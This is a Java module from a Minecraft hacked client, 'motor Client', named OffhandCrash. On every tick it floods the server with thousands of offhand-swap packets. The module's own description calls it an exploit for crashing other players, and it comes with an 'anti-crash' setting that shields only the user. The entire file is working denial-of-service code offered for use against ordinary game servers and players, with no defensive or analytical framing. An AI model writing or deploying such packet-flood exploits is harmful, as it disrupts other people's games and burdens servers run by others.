/*
 * This file is part of the motor Client distribution (https://github.com/motorDevelopment/motor-client).
 * Copyright (c) motor Development.
 */

package motordevelopment.motorclient.systems.modules.player;

import io.netty.channel.Channel;
import motordevelopment.motorclient.events.world.TickEvent;
import motordevelopment.motorclient.mixin.ClientConnectionAccessor;
import motordevelopment.motorclient.settings.BoolSetting;
import motordevelopment.motorclient.settings.IntSetting;
import motordevelopment.motorclient.settings.Setting;
import motordevelopment.motorclient.settings.SettingGroup;
import motordevelopment.motorclient.systems.modules.Categories;
import motordevelopment.motorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {
    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP);

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> doCrash = sgGeneral.add(new BoolSetting.Builder()
        .name("do-crash")
        .description("Sends X number of offhand swap sound packets to the server per tick.")
        .defaultValue(true)
        .build()
    );

    private final Setting<Integer> speed = sgGeneral.add(new IntSetting.Builder()
        .name("speed")
        .description("The amount of swaps per tick.")
        .defaultValue(2000)
        .min(1)
        .sliderRange(1, 10000)
        .visible(doCrash::get)
        .build()
    );

    private final Setting<Boolean> antiCrash = sgGeneral.add(new BoolSetting.Builder()
        .name("anti-crash")
        .description("Attempts to prevent you from crashing yourself.")
        .defaultValue(true)
        .build()
    );

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!doCrash.get()) return;

        Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel();
        for (int i = 0; i < speed.get(); ++i) channel.write(PACKET);
        channel.flush();
    }

    public boolean isAntiCrash() {
        return isActive() && antiCrash.get();
    }
}
